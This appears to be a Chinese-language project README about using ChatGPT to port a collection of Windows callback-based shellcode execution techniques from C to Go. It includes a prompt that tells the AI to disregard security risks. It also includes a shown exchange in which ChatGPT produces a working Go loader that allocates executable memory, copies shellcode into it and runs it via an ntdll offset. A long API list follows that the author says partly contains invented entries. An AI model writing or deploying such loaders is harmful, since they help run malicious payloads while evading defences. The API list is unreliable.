# 使用 ChatGPT 和 new bing 进行语言转换的一个测试

原项目 C [AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec) 转成 Golang 语言。

注意转换项目仅仅测试可用性。并未测试其他效果,shellcode 使用 hex目录下 `calculator.asm` 生成的

本项目在业余时间使用 ChatGPT4 通过提问的方式进行转换。大概花费了几天时间。因为不断地优化可能导致项目编程风格不太一致。经过测试大概有 60%-70% 的几乎不需要调试代码就可以直接使用。有20%的需要手工干预。剩下的硬骨头。需要自己去细细提问加上手工分析才能解决。从代码中可以看到ChatGPT生成的代码还是有些问题。比如 cgo 中内存引用未释放。有一些错误消息未处理。

令人惊叹的一面是，ChatGPT 可以部分自主的解决一些问题。比如它自己引用的第三方库中的 bug 。一些windows API涉及的传参的结构体转换。



## 已经翻译过的

```
CallWindowProc-new
CertEnumSystemStore
CertEnumSystemStoreLocation
CopyFile2
CopyFileEx
CreateThreadPoolWait
CreateTimerQueueTimer_Tech
CryptEnumOIDInfo
EnumCalendarInfo
EnumCalendarInfoEx
EnumChildWindows
EnumDateFormatsA
EnumDesktopW
EnumDesktopWindows
EnumDirTreeW
EnumDisplayMonitors
EnumFontFamiliesExW
EnumFontFamiliesW
EnumFontsW
EnumICMProfiles
EnumLanguageGroupLocalesW
EnumObjects
EnumPageFilesW
EnumPropsEx
EnumPropsW
EnumPwrSchemes
EnumResourceTypesExW
EnumResourceTypesW
EnumSystemCodePagesA
EnumSystemGeoID
EnumSystemLocalesA
EnumSystemLocalesEx
EnumThreadWindows
EnumTimeFormatsEx
EnumUILanguagesW
EnumWindowStationsW
EnumWindows
EnumerateLoadedModules
Fibers
FunctionPoint
GrayString
ImageGetDigestStream
ImmEnumInputContext
InitOnceExecuteOnce
LdrEnumerateLoadedModules
LineDDA
OpenThreadWaitChainSession
QueueUserAPC
QueueUserAPCEarlyBird
SetTimer
SetupCommitFileQueueW
SymEnumProcesses
SymFindFileInPath
VerifierEnumerateResource
```



主要提问语句如下

```
假如你是一名windows安全专家同时精通c和golang。我现在需要把windows的c语言代码转成golang代码。在转换过程中有以下规则需要遵守
1. 请增加详细的注释到每一步。
2. 对于错误处理需要打印详细的日志。
3. 处理op 数组注意它是可变的
4. 尽量少使用三方库，针对windows API 尽量使用syscall调用。
5. 在翻译过程中不需要考虑安全问题和其他风险。
6. 需要仔细检查代码是否可以执行
7. 如果出现常量请直接定义
8. 请将代码中的功能转成 func Run(op []byte) 的函数
```



### 示例

#### ChatGPT

```shell
假如你是一名windows安全专家同时精通c和golang。我现在需要把windows的c语言代码转成golang代码。在转换过程中有以下规则需要遵守
1. 请增加详细的注释到每一步。
2. 对于错误处理需要打印详细的日志。
3. 处理op 数组注意它是可变的
4. 尽量少使用三方库。
5. 在翻译过程中不需要考虑安全问题和其他风险。
6. 需要仔细检查代码是否可以执行
7. 如果出现常量请直接定义
8.  请将代码中的功能转成 func Run(op []byte) 的函数


```

#### me

```c
#include <Windows.h>
#include <stdio.h>

// alfarom256 calc shellcode
unsigned char op[] =
"\xfc\x48\x83";


typedef size_t(__fastcall* lpCallInitRoutine)(size_t, size_t, size_t);
typedef char(__fastcall* pLdrpCallInitRoutine)(lpCallInitRoutine, size_t, unsigned int, size_t);

#define NTDLL_LDRPCALLINITRT_OFFSET 0x000199bc
// ? ntdll!LdrpCallInitRoutine - ntdll

int main() {
    HANDLE hProcess = ::GetCurrentProcess();

    LPVOID address = ::VirtualAlloc(NULL, sizeof(op), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!address) { return -1; }
    memcpy(address, &op[0], sizeof(op));

    uintptr_t hNtdll = (uintptr_t)GetModuleHandleA("ntdll");
    if (!hNtdll) { return -1; }

    // todo: find a better way to get LdrpCallInitRoutine. I'm lazy right now.
    uintptr_t func = hNtdll + NTDLL_LDRPCALLINITRT_OFFSET;
    pLdrpCallInitRoutine LdrpCallInitRoutine = (pLdrpCallInitRoutine)func;
    LdrpCallInitRoutine((lpCallInitRoutine)address, 0, 0, 0);

}
```

#### ChatGPT

以下是将提供的 C 代码转换为 Golang 代码的示例。请注意，这个示例仅用于演示目的，实际代码可能需要根据具体需求进行调整。

```go
package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/alexbrainman/pe"
)

var op = []byte{
	0xfc, 0x48, 0x83,
}

const (
	ntdllLdrpCallInitRtOffset = 0x000199bc
)

func main() {
	Run(op)
}

func Run(op []byte) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	getModuleHandle := kernel32.NewProc("GetModuleHandleA")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")

	// Get handle of ntdll.dll
	hNtdll, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ntdll"))))
	if hNtdll == 0 {
		fmt.Println("Error: Unable to get ntdll.dll handle")
		return
	}

	// Allocate memory
	address, _, _ := virtualAlloc.Call(0, uintptr(len(op)), syscall.MEM_RESERVE|syscall.MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Println("Error: Unable to allocate memory")
		return
	}

	// Copy shellcode to allocated memory
	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op)

	// Calculate LdrpCallInitRoutine address
	ldrCallInitRoutineAddr := uintptr(hNtdll) + ntdllLdrpCallInitRtOffset

	// Call LdrpCallInitRoutine
	syscall.Syscall(ldrCallInitRoutineAddr, 4, address, 0, 0, 0)
}
```

在这个示例中，我使用了"syscall"库和 "github.com/alexbrainman/pe"库。尽管尽量减少了对第三方库的使用，但在某些情况下，这些库可以帮助简化代码和减少错误。我已经添加了详细的注释，并按照规则将代码中的功能转换为名为"Run"的函数。

#### me

```c
定义 const (
	MEM_RESERVE                 = 0x2000
	MEM_COMMIT                  = 0x1000
	PAGE_EXECUTE_READWRITE      = 0x40
	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
)
```

#### ChatGPT

根据您的要求，以下是将这些常量定义添加到Golang代码中的示例：

```go
package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var op = []byte{
	0xfc, 0x48, 0x83,
}

const (
	MEM_RESERVE                 = 0x2000
	MEM_COMMIT                  = 0x1000
	PAGE_EXECUTE_READWRITE      = 0x40
	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
)

func main() {
	Run(op)
}

func Run(op []byte) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	getModuleHandle := kernel32.NewProc("GetModuleHandleA")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")

	// Get handle of ntdll.dll
	hNtdll, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ntdll"))))
	if hNtdll == 0 {
		fmt.Println("Error: Unable to get ntdll.dll handle")
		return
	}

	// Allocate memory
	address, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Println("Error: Unable to allocate memory")
		return
	}

	// Copy shellcode to allocated memory
	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op)

	// Calculate LdrpCallInitRoutine address
	ldrCallInitRoutineAddr := uintptr(hNtdll) + NTDLL_LDRPCALLINITRT_OFFSET

	// Call LdrpCallInitRoutine
	syscall.Syscall(ldrCallInitRoutineAddr, 4, address, 0, 0, 0)
}

```





## 免责声明

本代码库仅测试ChatGPT生成代码的合理性，以及是否可以运行并且符合预期结果。在使用本代码过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本代码的过程中存在任何非法行为，您将自行承担所有后果，本代码所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本代码。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。

## 参考文献

1. [Executing Shellcode via Callbacks](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/)

2. [CSharp-Alt-Shellcode-Callbacks](https://github.com/wsummerhill/CSharp-Alt-Shellcode-Callbacks)

3. [www.vx-underground.org](https://www.vx-underground.org/windows.html)

4. [red team notes](https://www.ired.team/)

5. [WINDOWS系统交互与分析](https://github.com/YYRise/black-hat-go/blob/master/ch-12/ch12-Window-System-Interaction-and-Analysis.md)

6. [AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec)

7. [汇编语言编写shellcode实现弹窗计算器](https://yeanhoo.gitee.io/2020/07/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99shellcode%E5%AE%9E%E7%8E%B0%E5%BC%B9%E7%AA%97%E8%AE%A1%E7%AE%97%E5%99%A8/)
## 注意事项

有几个不是通用的属于未导出函数。这里直接移除



## 试着通过对 ChatGPT 提问获取的带回调参数的 Windows API

prompt 因为清理没有保存

**里面有它胡编的注意区分**


```shell
CallbackMayRunLong
CancelThreadpoolIo
CapCreateCaptureWindowA
CapCreateCaptureWindowW
CapDriverEnum
CertEnumCRLContextProperties
CertEnumCRLsInStore
CertEnumCTLContextProperties
CertEnumCTLsInStore
CertEnumCertificateContextProperties
CertEnumCertificatesInStore
CertEnumPhysicalStore
CertEnumSubjectInSortedCTL
CertEnumSystemStore
CertEnumSystemStoreLocation
CertEnumSystemStoreName
CertEnumSystemStoreType
ChangeServiceConfig2A
ChangeServiceConfig2W
ChangeTimerQueueTimer
CloseThreadpool
CloseThreadpoolCleanupGroup
CloseThreadpoolCleanupGroupMembers
CloseThreadpoolWork
CreateDialogIndirectParamA
CreateDialogIndirectParamW
CreateDialogParamA
CreateDialogParamW
CreateEventA
CreateEventW
CreateIoCompletionPort
CreateJobObjectA
CreateJobObjectW
CreateMutexA
CreateMutexW
CreateSemaphoreA
CreateSemaphoreW
CreateServiceA
CreateServiceW
CreateThreadpool
CreateThreadpoolCleanupGroup
CreateThreadpoolIo
CreateThreadpoolTimer
CreateThreadpoolWait
CreateThreadpoolWork
CreateTimerQueueTimer
CreateUmsCompletionList
CryptEnumKeyIdentifierProperties
CryptEnumOIDFunction
CryptEnumOIDInfo
CryptEnumProvidersA
CryptEnumProvidersW
DeleteTimerQueueTimer
DequeueUmsCompletionListItems
DhcpEnumOptionValues
DhcpEnumOptionValuesV5
DhcpEnumOptions
DhcpEnumOptionsV5
DhcpEnumServers
DhcpEnumServersV4
DhcpEnumServersV6
DhcpEnumSubnetClients
DhcpEnumSubnetClientsV5
DhcpEnumSubnetClientsVQ
DhcpEnumSubnetElements
DhcpEnumSubnetElementsV5
DhcpEnumSubnetElementsVQ
DhcpEnumSubnets
DhcpV4EnumSubnetClients
DhcpV4EnumSubnetClientsVQ
DhcpV4EnumSubnetElements
DhcpV4EnumSubnets
DhcpV6EnumSubnetClients
DhcpV6EnumSubnetClientsVQ
DhcpV6EnumSubnetElements
DhcpV6EnumSubnets
DisassociateCurrentThreadFromCallback
DnsQueryExA
DnsQueryExUtf8
DnsQueryExW
DnsRegisterHostAddrsEx
DnsReplaceRecordSetA
DnsReplaceRecordSetUtf8
DnsReplaceRecordSetW
EnumCalendarInfo
EnumCalendarInfoA
EnumCalendarInfoEx
EnumCalendarInfoExA
EnumCalendarInfoExEx
EnumCalendarInfoExW
EnumCalendarInfoW
EnumChildWindows
EnumClipboardFormats
EnumCounterNamesA
EnumCounterNamesW
EnumCounterTitlesA
EnumCounterTitlesW
EnumDateFormats
EnumDateFormatsA
EnumDateFormatsEx
EnumDateFormatsExA
EnumDateFormatsExEx
EnumDateFormatsExW
EnumDateFormatsW
EnumDependentServicesA
EnumDependentServicesW
EnumDesktopWindows
EnumDesktops
EnumDesktopsA
EnumDesktopsW
EnumDeviceDrivers
EnumDisplayDevices
EnumDisplayDevicesA
EnumDisplayDevicesW
EnumDisplayMonitors
EnumDisplaySettings
EnumDisplaySettingsA
EnumDisplaySettingsEx
EnumDisplaySettingsW
EnumDynamicTimeZoneInformation
EnumDynamicTimeZoneInformationEffectiveEnd
EnumDynamicTimeZoneInformationEffectiveStart
EnumDynamicTimeZoneInformationEx
EnumDynamicTimeZoneInformationExEffectiveEnd
EnumDynamicTimeZoneInformationExEffectiveStart
EnumFontFamilies
EnumFontFamiliesEx
EnumFonts
EnumICMProfiles
EnumIpForwardTable2
EnumIpNetTable2
EnumJobNamedProperties
EnumLanguageGroupLocales
EnumLanguageGroupLocalesA
EnumLanguageGroupLocalesEx
EnumLanguageGroupLocalesW
EnumMetaFile
EnumNetworkEvents
EnumObjects
EnumPortsA
EnumPortsW
EnumPrintProcessorDatatypes
EnumPrintProcessorDatatypesA
EnumPrintProcessorDatatypesW
EnumPrintProcessorsA
EnumPrintProcessorsW
EnumPrinterPropertySheets
EnumPrinters
EnumPrintersA
EnumPrintersW
EnumProcessModules
EnumProcessModulesEx
EnumProcessThreads
EnumProcesses
EnumProps
EnumPropsA
EnumPropsEx
EnumPropsExA
EnumPropsExW
EnumPropsW
EnumProtocolEntries
EnumProtocolsA
EnumProtocolsW
EnumPwrSchemes
EnumResourceLanguages
EnumResourceLanguagesA
EnumResourceLanguagesEx
EnumResourceLanguagesExA
EnumResourceLanguagesExW
EnumResourceLanguagesW
EnumResourceNames
EnumResourceNamesA
EnumResourceNamesEx
EnumResourceNamesExA
EnumResourceNamesExW
EnumResourceNamesW
EnumResourceTypes
EnumResourceTypesA
EnumResourceTypesEx
EnumResourceTypesExA
EnumResourceTypesExW
EnumResourceTypesW
EnumRouteTables
EnumServicesStatus
EnumServicesStatusA
EnumServicesStatusEx
EnumServicesStatusExA
EnumServicesStatusExW
EnumServicesStatusW
EnumServicesTypesA
EnumServicesTypesW
EnumSystemActiveProcessModules
EnumSystemCodePages
EnumSystemCodePagesA
EnumSystemCodePagesEx
EnumSystemCodePagesW
EnumSystemFirmwareTables
EnumSystemGeoID
EnumSystemLanguageGroups
EnumSystemLanguageGroupsA
EnumSystemLanguageGroupsEx
EnumSystemLanguageGroupsW
EnumSystemLocales
EnumSystemLocalesA
EnumSystemLocalesEx
EnumSystemLocalesExA
EnumSystemLocalesExW
EnumSystemLocalesW
EnumSystemTimeZoneInformation
EnumThreadWindows
EnumTimeFormats
EnumTimeFormatsA
EnumTimeFormatsEx
EnumTimeFormatsExA
EnumTimeFormatsExW
EnumTimeFormatsW
EnumTimeZoneInformation
EnumTraceGuids
EnumTraceGuidsEx
EnumUILanguages
EnumUILanguagesA
EnumUILanguagesEx
EnumUILanguagesW
EnumUnicastIpAddressTable
EnumWindowStationsA
EnumWindowStationsW
EnumWindows
EnumerateLoadedModules
EnumerateLoadedModules64
EnumerateLoadedModulesEx
EnumerateLoadedModulesExW
EnumerateLoadedModulesW
EnumerateSecurityPackagesA
EnumerateSecurityPackagesW
EnumerateTrustedDomainsExA
EnumerateTrustedDomainsExW
ExecuteUmsThread
ExtTextOut
FindFirstChangeNotification
FindFirstFileEx
FindFirstUrlCacheEntryEx
FindFirstVolume
FindFirstVolumeA
FindFirstVolumeMountPoint
FindFirstVolumeW
FindNextChangeNotification
FindNextUrlCacheEntryEx
FindNextVolume
FindNextVolumeA
FindNextVolumeMountPoint
FindNextVolumeW
FtpFindFirstFile
GetAddrInfoExA
GetAddrInfoExW
GetCompressedFileSizeTransactedA
GetCompressedFileSizeTransactedW
GetFileVersionInfoExA
GetFileVersionInfoExW
GetFileVersionInfoSizeEx
GetGeoInfoA
GetGeoInfoW
GetIcmpStatistics
GetIcmpStatisticsEx
GetIfEntry2
GetIfEntry2Ex
GetIfStackTable
GetIfTable2
GetIfTable2Ex
GetIpAddrTable
GetIpForwardTable
GetIpNetTable
GetIpStatistics
GetIpStatisticsEx
GetModuleHandleExA
GetModuleHandleExW
GetOpenFileName
GetOpenFileNameA
GetOpenFileNamePreviewA
GetOpenFileNamePreviewW
GetOpenFileNameW
GetQueuedCompletionStatus
GetQueuedCompletionStatusEx
GetSaveFileName
GetSaveFileNameA
GetSaveFileNamePreviewA
GetSaveFileNamePreviewW
GetSaveFileNameW
GetTcp6Table
GetTcp6Table2
GetTcpStatistics
GetTcpStatisticsEx
GetTcpTable
GetTcpTable2
GetThreadpoolStackInformation
GetUdp6Table
GetUdpStatistics
GetUdpStatisticsEx
GetUdpTable
GetUmsCompletionListEvent
GetVolumePathNamesForVolumeNameA
GetVolumePathNamesForVolumeNameW
GradientFill
GrayString
HttpEndRequest
HttpQueryInfo
HttpSendRequest
HttpSendRequestEx
HttpSetStatusCallback
Icmp6SendEcho2
IcmpSendEcho2
IcmpSendEcho2Ex
ImageList_DrawEx
InSendMessageEx
InternetConnect
InternetErrorDlg
InternetFindNextFile
InternetGetLastResponseInfo
InternetGetLastResponseInfoA
InternetGetLastResponseInfoW
InternetReadFile
InternetReadFileEx
InternetSetFilePointer
InternetSetStatusCallback
InternetSetStatusCallbackA
InternetSetStatusCallbackEx
InternetSetStatusCallbackW
InternetWriteFile
LineDDA
LineDDAProc
ListView_SetCallbackMask
LsaEnumerateAccountRights
LsaEnumerateAccounts
LsaEnumeratePrivileges
LsaEnumerateTrustedDomains
LsaEnumerateTrustedDomainsEx
NetEnumerateTrustedDomains
OpenEventA
OpenEventW
OpenJobObjectA
OpenJobObjectW
OpenMutexA
OpenMutexW
OpenSemaphoreA
OpenSemaphoreW
PostQueuedCompletionStatus
PrintDlgEx
RasEnumAutodialAddresses
RasEnumAutodialAddressesA
RasEnumAutodialAddressesW
RasEnumConnections
RasEnumConnectionsA
RasEnumConnectionsW
RasEnumDevices
RasEnumDevicesA
RasEnumDevicesW
RasEnumEntries
RasEnumEntriesA
RasEnumEntriesW
RasEnumPortsA
RasEnumPortsW
ReadDirectoryChangesW
RegEnumKey
RegEnumKeyA
RegEnumKeyEx
RegEnumKeyExA
RegEnumKeyExW
RegEnumKeyW
RegEnumValue
RegEnumValueA
RegEnumValueW
RegNotifyChangeKeyValue
RegisterClassEx
RegisterClassExA
RegisterClassExW
RegisterDeviceNotification
RegisterDeviceNotificationA
RegisterDeviceNotificationW
RegisterPowerSettingNotification
RegisterWaitForSingleObject
RegisterWaitForSingleObjectEx
SetAddrInfoExA
SetAddrInfoExW
SetConsoleCtrlHandler
SetThreadExecutionState
SetThreadpoolCallbackCleanupGroup
SetThreadpoolCallbackLibrary
SetThreadpoolIo
SetThreadpoolStackInformation
SetThreadpoolThreadMaximum
SetThreadpoolThreadMinimum
SetThreadpoolTimer
SetThreadpoolWait
SetTimer
SetWinEventHook
SetWindowLong
SetWindowLongPtr
SetWindowText
SetWindowsHook
SetWindowsHookEx
SetupCommitFileQueueA
SetupCommitFileQueueW
SetupCopyOEMInfA
SetupCopyOEMInfW
SetupDiBuildClassInfoListEx
SetupDiGetClassDescriptionEx
SetupDiGetClassImageIndex
SetupDiGetClassImageListEx
SetupDiGetClassInstallParams
SetupDiGetDeviceInfoListDetail
SetupDiGetDeviceInstallParams
SetupDiGetDeviceRegistryProperty
SetupDiGetDriverInfoDetail
SetupDiGetSelectedDriverEx
SetupDiGetWizardPage
SetupGetFileCompressionInfoEx
SetupIterateCabinet
SetupIterateCabinetA
SetupIterateCabinetW
SetupQueueCopyA
SetupQueueCopyIndirect
SetupQueueCopyW
SetupQueueDeleteA
SetupQueueDeleteW
SetupQueueRenameA
SetupQueueRenameW
SetupScanFileQueue
SetupSetFileQueueAlternatePlatform
SetupTerminateFileLog
SfcGetNextProtectedFile
SfcIsFileProtected
SfcIsKeyProtected
StartThreadpoolIo
SubmitThreadpoolWork
SymEnumProcesses
SymEnumSymbols
SymEnumSymbolsForAddr
SymEnumSymbolsForAddrW
SymEnumSymbolsW
SymEnumTypes
SymEnumTypesByName
SymEnumTypesByNameW
SymEnumTypesW
Toolhelp32ReadProcessMemory
UmsThreadYield
UnhookWinEvent
UnregisterPowerSettingNotification
UnregisterWait
UnregisterWaitEx
UrlMkSetSessionOption
WNetEnumCachedPasswords
WNetEnumResource
WNetEnumResourceA
WNetEnumResourceW
WSAEnumProtocolsA
WSAEnumProtocolsW
WSAIoctl
WSALookupServiceBeginA
WSALookupServiceBeginW
WSALookupServiceEnd
WSALookupServiceNextA
WSALookupServiceNextW
WSANSPIoctl
WSARecv
WSARecvFrom
WSASend
WSASendTo
WSAWaitForMultipleEvents
WSCEnumProtocols
WSCEnumProtocolsEx
WSCGetProviderPath
WSCInstallProviderEx
WSCUpdateProvider
WSCWriteProviderOrder
WSCWriteProviderOrderEx
WTSEnumerateProcesses
WTSEnumerateProcessesA
WTSEnumerateProcessesExA
WTSEnumerateProcessesExW
WTSEnumerateProcessesW
WTSEnumerateServers
WTSEnumerateServersA
WTSEnumerateServersW
WTSEnumerateSessions
WTSEnumerateSessionsA
WTSEnumerateSessionsExA
WTSEnumerateSessionsExW
WTSEnumerateSessionsW
WTSQueryUserConfigA
WTSQueryUserConfigW
WTSQueryUserToken
WTSRegisterSessionNotification
WTSRegisterSessionNotificationEx
WTSUnRegisterSessionNotification
WTSUnRegisterSessionNotificationEx
WaitForThreadpoolIoCallbacks
WaitForThreadpoolTimerCallbacks
WaitForThreadpoolWaitCallbacks
WaitForThreadpoolWorkCallbacks
XmlLiteReader_GetProperty
```